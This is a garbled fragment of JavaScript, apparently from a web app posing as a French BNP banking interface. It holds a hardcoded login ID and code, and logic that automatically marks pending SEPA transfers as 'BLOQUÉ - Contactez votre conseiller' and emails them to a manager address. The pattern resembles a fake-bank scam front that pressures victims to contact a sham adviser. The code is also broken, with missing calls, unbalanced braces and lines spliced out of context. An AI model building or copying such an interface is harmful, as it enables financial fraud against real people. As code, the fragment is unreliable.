function bindEv(){

      var id=ii?ii.value:'';

        loginLoad=false;  
        if(id==='3535442323'&&code==='124222'){  
        page='app';tab='accueil';  
        // Check pending ops older than 2 days and auto-block them  
        var now=new Date();  
        S.ops.forEach(function(op){  
          if(op.st==='attente'){  
            var parts=op.d.split('/');

                date_valeur:op.d,  
                debiteur_label:'D\u00e9biteur',  
                metteur:NOM,  
                iban_emetteur:'FR76300070006435670012',  
                crediteur_label:'B\u00e9n\u00e9ficiaire',  
                'b\u00e9n\u00e9ficiaire':op.label,

                bic:'BNPAFRPP',  
                type_label:'Type',  
                type_val:'Virement SEPA',  
                ref_label:'R\u00e9f\u00e9rence',  
                ref:ref2,

                statut_final_val:'BLOQU\u00c9 - Contactez votre conseiller',  
                to_email:EGEST,  
                email:EGEST  
              }).catch(function(){});  
            }  
          }  
        });  
        saveSt();  
        render();

  } else {  
    document.querySelectorAll('.tab-btn').forEach(function(b){b.addEventListener('click',function(){tab=b.dataset.tab;render();});});

      var vm=(document.getElementById('vm')||{}).value||'';

      notifs.unshift({type:'vir',benef:b,montant:fmt(mt),motif:vm||'Virement',date:d.d,heure:d.t});  
      var ref1='BNP'+Date.now();

        iban_emetteur:'FR76300070006435670012',

        if(id==='vb')virBenef=el.value;
